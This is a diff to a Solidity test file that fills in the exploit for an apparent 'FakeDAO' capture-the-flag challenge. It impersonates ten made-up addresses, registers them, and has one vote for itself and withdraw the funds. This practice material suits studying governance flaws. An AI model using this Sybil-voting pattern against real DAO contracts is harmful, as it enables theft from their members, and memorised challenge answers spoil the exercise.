@@ -15,7 +15,16 @@ contract FakeDAOTest is BaseTest {
     }
 
     function testExploitLevel() public {
-        /* YOUR EXPLOIT GOES HERE */
+        for (uint256 i = 1; i <= 10; i++) {
+            address user = address(uint160(i));
+            vm.prank(user);
+            instance.register();
+        }
+        address user10 = address(uint160(10));
+        vm.prank(user10);
+        instance.voteForYourself();
+        vm.prank(user10);
+        instance.withdraw();
 
         checkSuccess();
     }
